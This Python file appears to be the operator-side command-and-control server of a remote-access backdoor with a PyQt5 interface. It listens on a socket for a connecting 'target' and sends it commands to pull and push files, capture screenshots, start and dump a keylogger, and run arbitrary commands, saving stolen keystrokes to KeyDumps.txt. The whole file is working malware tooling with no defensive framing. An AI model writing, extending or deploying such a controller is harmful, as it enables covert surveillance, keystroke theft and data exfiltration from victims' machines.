import socket
import json
import base64
import time
import os, stat
import requests
from termcolor import colored
from PyQt5.QtGui import QTextCursor, QTextDocument,QImage,qRgb
from PyQt5.QtCore import QUrl, QVariant


count = 1

def reliable_send(data):
	if type(data) == bytes:
		data = data.decode('utf-8')
	json_data = json.dumps(data)
	target.sendall(json_data.encode())

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def shell(backdoor,feature, path):
	
	global count
     
	if path == "":
		command= str(feature)
	else:
		command = str(feature)+" "+str(path)
	reliable_send(command)
	x=1
	while x==1: 
		x=x+1
		
		if feature  == "keylogger_start":
			continue
		
		elif feature == "download":
			result = reliable_recv()
			if result[:3] != '[!]':
				os.chmod('E:\project\guiapp', stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)
				file = open("file", "wb")
				file.write(base64.b64decode(result))
				file.close()
				output3 ="[+] Downloaded successfully"
				backdoor.backdoor_textBrowser.append(output3)

			else:
				output4 =str(result)
				backdoor.backdoor_textBrowser.append(output4)


		elif feature  == "upload":
			try:
				with open (path, "rb") as fin:
					reliable_send (base64.b64encode(fin.read()))
				output4="[+] uploaded successfully"
				backdoor.backdoor_textBrowser.append(output4)
				
			except:
				result = "[!] File Not Found"
				reliable_send(result)
				
		elif feature == "screenshot":
			screen = open("screenshot_" + str(count) + ".png", "wb")		
			image = reliable_recv()
			image_decoded = base64.b64decode(image)
			try:
				screen.write(image_decoded)
				screen.close()
				output5="[+] screenshot saved successfully as screenshot_"+str(count)+ ".png "
				backdoor.backdoor_textBrowser.append(output5)
				#document = QTextDocument()
				#document.addResource(QTextDocument.ImageResource, QUrl("screenshot_1.png"),QVariant(image))
				#backdoor.backdoor_textBrowser.setdocument(document)
				#backdoor.backdoor_textBrowser.append('<img src="screenshot_1.png">')
				document = backdoor.backdoor_textBrowser.document()
				cursor = QTextCursor(document)
				p1 = cursor.position()
				cursor.insertImage("screenshot_" + str(count) + ".png")
				count += 1
			except:
				output6="[!] Can't took screenshot"
				backdoor.backdoor_textBrowser.append(output6)
				#os.remove("screenshot_" + str(count) + ".png")
				
				
		
		elif feature == "keylog_start":
			continue
		
		elif feature == "keylog_dump":
			result = reliable_recv()
			save_log = open('KeyDumps.txt','w')
			header = "\n\n------------------------------------"+ str(time.ctime(time.time()))+"------------------------------------ \n\n"
			save_log.write(header + result)
			save_log.close()
			output7="[+] Saved Logs as KeyDumps.txt"
			backdoor.backdoor_textBrowser.append(output7)
		elif feature == "get":
			result = reliable_recv()
			print(result)
			output10 ="[+] file Downloaded successfully in target"
			backdoor.backdoor_textBrowser.append(output10)
		else:
			result = reliable_recv()
			print(result)

def download(url):
	get_response = requests.get(url)
	
	file_name = url.split("/")[-1]
	out_file =open(file_name, "wb")
	out_file.write(get_response.content)

def accept_conn(backdoor):
	global ip
	global target
	timeout= 300
	s.settimeout(int(timeout))


	try:
		output6="[+] Listening for Incoming connections...."
		backdoor.backdoor_textBrowser.append(output6)
		target, ip = s.accept()
	except socket.error:
		output7="[-] server error try again later"
		backdoor.backdoor_textBrowser.append(output7)


def server(backdoor):
	global s
	
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(('192.168.56.52',44445))
	s.listen(5)
	accept_conn(backdoor)	
	output="[+] Target Connected!"
	backdoor.backdoor_textBrowser.append(output)		
def main(backdoor,feature, path ):
	shell(backdoor,feature, path)
	s.close()